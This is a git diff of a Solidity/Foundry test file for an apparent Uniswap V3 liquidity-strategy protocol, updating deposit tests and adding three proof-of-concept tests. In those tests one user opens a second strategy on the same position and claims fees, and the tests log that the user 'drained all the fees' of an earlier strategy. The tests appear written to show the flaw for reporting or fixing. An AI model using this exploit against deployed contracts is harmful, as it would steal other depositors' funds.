@@ -13,8 +13,8 @@ import { Constants } from "../src/libraries/Constants.sol";
 
 import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import { TickMath } from "@uniswap/v3-core/contracts/libraries/TickMath.sol";
-import { IUniswapV3Pool } from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
 import { ISwapRouter } from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
+import { IUniswapV3Pool } from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
 
 import "forge-std/console.sol";
 
@@ -152,6 +152,9 @@ contract CLTDepositTest is Test, Fixtures {
     }
 
     function test_deposit_multipleUsers() public {
+        initPoolAndAddLiquidity();
+        initRouter();
+
         address payable[] memory users = utils.createUsers(2);
         uint256 depositAmount = 5 ether;
 
@@ -193,31 +196,42 @@ contract CLTDepositTest is Test, Fixtures {
         assertEq(account.totalShares, (depositAmount * 2) + 1);
         assertEq(liquidityShareUser1, depositAmount + 1);
 
-        /// try swapping here to check contract balances || approval needed
-        // router.exactInputSingle(
-        //     ISwapRouter.ExactInputSingleParams({
-        //         tokenIn: address(token0),
-        //         tokenOut: address(token1),
-        //         fee: 500,
-        //         recipient: address(this),
-        //         deadline: block.timestamp + 1 days,
-        //         amountIn: 1 ether,
-        //         amountOutMinimum: 0,
-        //         sqrtPriceLimitX96: 0
-        //     })
-        // );
+        // try swapping here to check contract balances
+        router.exactInputSingle(
+            ISwapRouter.ExactInputSingleParams({
+                tokenIn: address(token0),
+                tokenOut: address(token1),
+                fee: 500,
+                recipient: address(this),
+                deadline: block.timestamp + 1 days,
+                amountIn: 1e30,
+                amountOutMinimum: 0,
+                sqrtPriceLimitX96: 0
+            })
+        );
 
-        // (, int24 t,,,,,) = pool.slot0();
-        // console.logInt(t);
+        router.exactInputSingle(
+            ISwapRouter.ExactInputSingleParams({
+                tokenIn: address(token1),
+                tokenOut: address(token0),
+                fee: 500,
+                recipient: address(this),
+                deadline: block.timestamp + 1 days,
+                amountIn: 1e30,
+                amountOutMinimum: 0,
+                sqrtPriceLimitX96: 0
+            })
+        );
 
         vm.prank(users[1]);
         base.deposit(params);
 
-        (, uint256 liquidityShareUser2,,,,) = base.positions(3);
         (,,,,,,,, account) = base.strategies(strategyID);
 
-        assertEq(account.totalShares, (depositAmount * 3) + 2);
-        assertEq(liquidityShareUser2, depositAmount + 1);
+        (, uint256 liquidityShareUser2,,,,) = base.positions(3);
+
+        assertEq(account.balance0, 360_616_736_599_641);
+        assertEq(account.totalShares, (depositAmount * 2) + liquidityShareUser2 + 1);
     }
 
     function test_deposit_succeedsOutOfRangeDeposit() public {
@@ -254,13 +268,309 @@ contract CLTDepositTest is Test, Fixtures {
         base.deposit(params);
 
         (, uint256 liquidityShareUser2,,,,) = base.positions(2);
-        (,,,,,,,, ICLTBase.Account memory account) = base.strategies(strategyID);
 
-        console.log(liquidityShareUser2, account.totalShares, account.uniswapLiquidity);
-        console.log(account.balance0, account.balance1);
+        assertEq(liquidityShareUser2, 498_625_034_701_312_208);
     }
 
-    function test_deposit_shouldReturnExtraETH() public { }
+    function test_deposit_shouldReturnExtraETH() public {
+        pool = IUniswapV3Pool(factory.createPool(address(weth), address(token1), 500));
+        pool.initialize(TickMath.getSqrtRatioAtTick(0));
 
-    function test_deposit() public { }
+        key = ICLTBase.StrategyKey({ pool: pool, tickLower: -100, tickUpper: 100 });
+        ICLTBase.PositionActions memory actions = createStrategyActions(2, 3, 0, 3, 0, 0);
+
+        base.createStrategy(key, actions, 0, 0, true, false);
+
+        bytes32 strategyID = getStrategyID(address(this), 2);
+        uint256 depositAmount = 3 ether;
+
+        ICLTBase.DepositParams memory params = ICLTBase.DepositParams({
+            strategyId: strategyID,
+            amount0Desired: depositAmount,
+            amount1Desired: depositAmount,
+            amount0Min: 0,
+            amount1Min: 0,
+            recipient: msg.sender
+        });
+
+        uint256 balanceBefore = address(this).balance;
+        base.deposit{ value: depositAmount + 2 ether }(params);
+
+        assertEq(address(this).balance, balanceBefore - depositAmount);
+    }
+
+    function test_poc_scenerio1() public {
+        initPoolAndAddLiquidity();
+        initRouter();
+
+        address payable[] memory users = utils.createUsers(2);
+        uint256 depositAmount = 5 ether;
+
+        token0.mint(users[0], depositAmount);
+        token0.mint(users[1], depositAmount);
+
+        token1.mint(users[0], depositAmount);
+        token1.mint(users[1], depositAmount);
+
+        vm.startPrank(users[0]);
+        token0.approve(address(base), depositAmount);
+        token1.approve(address(base), depositAmount);
+        vm.stopPrank();
+
+        vm.startPrank(users[1]);
+        token0.approve(address(base), depositAmount);
+        token1.approve(address(base), depositAmount);
+        vm.stopPrank();
+
+        bytes32 strategyID1 = getStrategyID(address(this), 1);
+
+        vm.prank(users[0]);
+        base.deposit(
+            ICLTBase.DepositParams({
+                strategyId: strategyID1,
+                amount0Desired: depositAmount,
+                amount1Desired: depositAmount,
+                amount0Min: 0,
+                amount1Min: 0,
+                recipient: users[0]
+            })
+        );
+
+        // create 2nd strategy with same compounding tunrned on
+        ICLTBase.PositionActions memory actions = createStrategyActions(2, 3, 0, 3, 0, 0);
+        base.createStrategy(key, actions, 0, 0, false, false);
+
+        bytes32 strategyID2 = getStrategyID(address(this), 2);
+
+        vm.prank(users[1]);
+        base.deposit(
+            ICLTBase.DepositParams({
+                strategyId: strategyID2,
+                amount0Desired: depositAmount,
+                amount1Desired: depositAmount,
+                amount0Min: 0,
+                amount1Min: 0,
+                recipient: users[1]
+            })
+        );
+
+        (, uint256 liquidityShareUser1,,,,) = base.positions(1);
+        (, uint256 liquidityShareUser2,,,,) = base.positions(2);
+
+        console.log("user 1 & 2 deposits -> ", liquidityShareUser1, liquidityShareUser2);
+
+        router.exactInputSingle(
+            ISwapRouter.ExactInputSingleParams({
+                tokenIn: address(token0),
+                tokenOut: address(token1),
+                fee: 500,
+                recipient: address(this),
+                deadline: block.timestamp + 1 days,
+                amountIn: 1e30,
+                amountOutMinimum: 0,
+                sqrtPriceLimitX96: 0
+            })
+        );
+
+        base.updateFees(key);
+
+        (,,, uint256 fee0, uint256 fee1) =
+            key.pool.positions(keccak256(abi.encodePacked(address(base), key.tickLower, key.tickUpper)));
+
+        console.log("total fees of both strategies -> ", fee0, fee1);
+
+        vm.prank(users[1]);
+        base.claimPositionFee(ICLTBase.ClaimFeesParams({ recipient: users[1], tokenId: 2, refundAsETH: true }));
+
+        (,,, fee0, fee1) = key.pool.positions(keccak256(abi.encodePacked(address(base), key.tickLower, key.tickUpper)));
+        console.log("After user2 claimed fees total fees is now -> ", fee0, fee1);
+
+        console.log(
+            "user2 successfully drained all the fees of previous created strategy -> ", token0.balanceOf(users[1])
+        );
+    }
+
+    function test_poc_scenerio2() public {
+        initPoolAndAddLiquidity();
+        initRouter();
+
+        address payable[] memory users = utils.createUsers(2);
+        uint256 depositAmount = 5 ether;
+
+        token0.mint(users[0], depositAmount);
+        token0.mint(users[1], depositAmount);
+
+        token1.mint(users[0], depositAmount);
+        token1.mint(users[1], depositAmount);
+
+        vm.startPrank(users[0]);
+        token0.approve(address(base), depositAmount);
+        token1.approve(address(base), depositAmount);
+        vm.stopPrank();
+
+        vm.startPrank(users[1]);
+        token0.approve(address(base), depositAmount);
+        token1.approve(address(base), depositAmount);
+        vm.stopPrank();
+
+        bytes32 strategyID1 = getStrategyID(address(this), 1);
+
+        vm.prank(users[0]);
+        base.deposit(
+            ICLTBase.DepositParams({
+                strategyId: strategyID1,
+                amount0Desired: depositAmount,
+                amount1Desired: depositAmount,
+                amount0Min: 0,
+                amount1Min: 0,
+                recipient: users[0]
+            })
+        );
+
+        router.exactInputSingle(
+            ISwapRouter.ExactInputSingleParams({
+                tokenIn: address(token0),
+                tokenOut: address(token1),
+                fee: 500,
+                recipient: address(this),
+                deadline: block.timestamp + 1 days,
+                amountIn: 1e30,
+                amountOutMinimum: 0,
+                sqrtPriceLimitX96: 0
+            })
+        );
+
+        base.updateFees(key);
+
+        (,,, uint256 fee0, uint256 fee1) =
+            key.pool.positions(keccak256(abi.encodePacked(address(base), key.tickLower, key.tickUpper)));
+
+        console.log("total fees of first strategy -> ", fee0, fee1);
+
+        // create 2nd strategy with compounding turned off
+        ICLTBase.PositionActions memory actions = createStrategyActions(2, 3, 0, 3, 0, 0);
+        base.createStrategy(key, actions, 0, 0, false, false);
+
+        bytes32 strategyID2 = getStrategyID(address(this), 2);
+
+        vm.prank(users[1]);
+        base.deposit(
+            ICLTBase.DepositParams({
+                strategyId: strategyID2,
+                amount0Desired: depositAmount,
+                amount1Desired: depositAmount,
+                amount0Min: 0,
+                amount1Min: 0,
+                recipient: users[1]
+            })
+        );
+
+        (, uint256 liquidityShareUser1,,,,) = base.positions(1);
+        (, uint256 liquidityShareUser2,,,,) = base.positions(2);
+
+        console.log("user 1 & 2 deposits -> ", liquidityShareUser1, liquidityShareUser2);
+
+        vm.prank(users[1]);
+        base.claimPositionFee(ICLTBase.ClaimFeesParams({ recipient: users[1], tokenId: 2, refundAsETH: true }));
+
+        (,,, fee0, fee1) = key.pool.positions(keccak256(abi.encodePacked(address(base), key.tickLower, key.tickUpper)));
+        console.log("After user2 claimed fees total fees is now -> ", fee0, fee1);
+
+        console.log(
+            "user2 successfully drained all the fees of previous created strategy -> ", token0.balanceOf(users[1])
+        );
+    }
+
+    function test_poc_scenerio3() public {
+        initPoolAndAddLiquidity();
+        initRouter();
+
+        address payable[] memory users = utils.createUsers(2);
+        uint256 depositAmount = 5 ether;
+
+        token0.mint(users[0], depositAmount);
+        token0.mint(users[1], depositAmount);
+
+        token1.mint(users[0], depositAmount);
+        token1.mint(users[1], depositAmount);
+
+        vm.startPrank(users[0]);
+        token0.approve(address(base), depositAmount);
+        token1.approve(address(base), depositAmount);
+        vm.stopPrank();
+
+        vm.startPrank(users[1]);
+        token0.approve(address(base), depositAmount);
+        token1.approve(address(base), depositAmount);
+        vm.stopPrank();
+
+        bytes32 strategyID1 = getStrategyID(address(this), 1);
+
+        vm.prank(users[0]);
+        base.deposit(
+            ICLTBase.DepositParams({
+                strategyId: strategyID1,
+                amount0Desired: depositAmount,
+                amount1Desired: depositAmount,
+                amount0Min: 0,
+                amount1Min: 0,
+                recipient: users[0]
+            })
+        );
+
+        // create 2nd strategy with compounding turned off
+        ICLTBase.PositionActions memory actions = createStrategyActions(2, 3, 0, 3, 0, 0);
+        base.createStrategy(key, actions, 0, 0, false, false);
+
+        bytes32 strategyID2 = getStrategyID(address(this), 2);
+
+        vm.prank(users[1]);
+        base.deposit(
+            ICLTBase.DepositParams({
+                strategyId: strategyID2,
+                amount0Desired: depositAmount,
+                amount1Desired: depositAmount,
+                amount0Min: 0,
+                amount1Min: 0,
+                recipient: users[1]
+            })
+        );
+
+        (, uint256 liquidityShareUser1,,,,) = base.positions(1);
+        (, uint256 liquidityShareUser2,,,,) = base.positions(2);
+
+        console.log("user 1 & 2 deposits -> ", liquidityShareUser1, liquidityShareUser2);
+
+        router.exactInputSingle(
+            ISwapRouter.ExactInputSingleParams({
+                tokenIn: address(token0),
+                tokenOut: address(token1),
+                fee: 500,
+                recipient: address(this),
+                deadline: block.timestamp + 1 days,
+                amountIn: 1e30,
+                amountOutMinimum: 0,
+                sqrtPriceLimitX96: 0
+            })
+        );
+
+        base.updateFees(key);
+
+        (,,, uint256 fee0, uint256 fee1) =
+            key.pool.positions(keccak256(abi.encodePacked(address(base), key.tickLower, key.tickUpper)));
+
+        console.log("total fees of both strategies -> ", fee0, fee1);
+
+        vm.prank(users[1]);
+        base.claimPositionFee(ICLTBase.ClaimFeesParams({ recipient: users[1], tokenId: 2, refundAsETH: true }));
+
+        (,,, fee0, fee1) = key.pool.positions(keccak256(abi.encodePacked(address(base), key.tickLower, key.tickUpper)));
+        console.log("After user2 claimed fees total fees is now -> ", fee0, fee1);
+
+        console.log(
+            "user2 successfully drained all the fees of previous created strategy -> ", token0.balanceOf(users[1])
+        );
+    }
+
+    receive() external payable { }
 }
